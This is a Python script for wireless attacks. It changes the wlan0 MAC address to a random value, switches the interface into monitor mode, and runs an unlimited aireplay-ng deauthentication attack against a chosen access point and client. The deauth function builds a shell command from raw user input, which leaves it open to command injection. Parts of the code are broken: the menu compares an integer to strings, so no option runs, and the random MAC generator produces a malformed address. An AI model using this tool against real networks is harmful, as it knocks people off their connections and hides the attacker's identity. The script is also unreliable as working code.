import subprocess
import random
import re
import time


def change_mac_address():

    # Get the current MAC address
    result = subprocess.run(["ifconfig", "wlan0"], stdout=subprocess.PIPE)
    output = result.stdout.decode("utf-8")
    match = re.search(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", output)

    if match:
        current_mac = match.group(0)
        print("[+] Current MAC address: {0}".format(current_mac))
    else:
        print("[-] Unable to retrieve current MAC address")
        return

    # Generate a new random MAC address
    new_mac = "".join([
        "{0:0>2X}".format(random.randint(0, 255)) if i % 3 else ":"
        for i in range(17)
    ])[1:]

    # Change the MAC address
    result = subprocess.run(["ifconfig", "wlan0", "down"])
    result = subprocess.run(["ifconfig", "wlan0", "hw", "ether", new_mac])
    result = subprocess.run(["ifconfig", "wlan0", "up"])

    # Verify the MAC address has been changed
    result = subprocess.run(["ifconfig", "wlan0"], stdout=subprocess.PIPE)
    output = result.stdout.decode("utf-8")
    match = re.search(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", output)

    if match:
        current_mac = match.group(0)
        if current_mac == new_mac:
            print("[+] MAC address successfully changed to")
            print(new_mac)
        else:
            print("[-] MAC address was not changed")
    else:
        print("[-] Unable to retrieve current MAC address")


# Monitor Mode
def MonitorMode(interface, state):
    if state == "on":
        subprocess.call(["ifconfig", interface, "down"])
        subprocess.call(["iwconfig", interface, "mode", "monitor"])
        subprocess.call(["ifconfig", interface, "up"])
        print("[+] Monitor mode enabled")
    elif state == "off":
        subprocess.call(["ifconfig", interface, "down"])
        subprocess.call(["iwconfig", interface, "mode", "managed"])
        subprocess.call(["ifconfig", interface, "up"])
        print("[+] Monitor mode disabled")


# Deauth
def Deauth(interface, bssid, client_mac):
    command = f"aireplay-ng --deauth 0 -a {bssid} -c {client_mac} {interface}"
    subprocess.call(command, shell=True)
    print("[+] Deauth packet sent")


# Main
def main():
    while True:
        print("1. Monitor mode (on/off)")
        print("2. Deauth attack")
        print("3. Change MAC address")
        print("4. Quit")
# Logic of the code
        option = int(input("Enter option number: "))

        if option == "1":
            state = input("Turn on (on) or off (off) monitor mode?\n")
            MonitorMode(interface, state)
        elif option == "2":
            bssid = input("Enter BSSID: ")
            client_mac = input("Enter client MAC address: ")
            Deauth(interface, bssid, client_mac)
            time.sleep(1)
        elif option == "3":
            change_mac_address()
        elif option == "4":
            print("Quitting...")
            break
        else:
            print("Invalid option, try again")


# vars
if __name__ == "__main__":
    interface = "wlan0"
    bssid = "00:11:22:33:44:55"
    client_mac = "66:77:88:99:AA:BB"
    main()
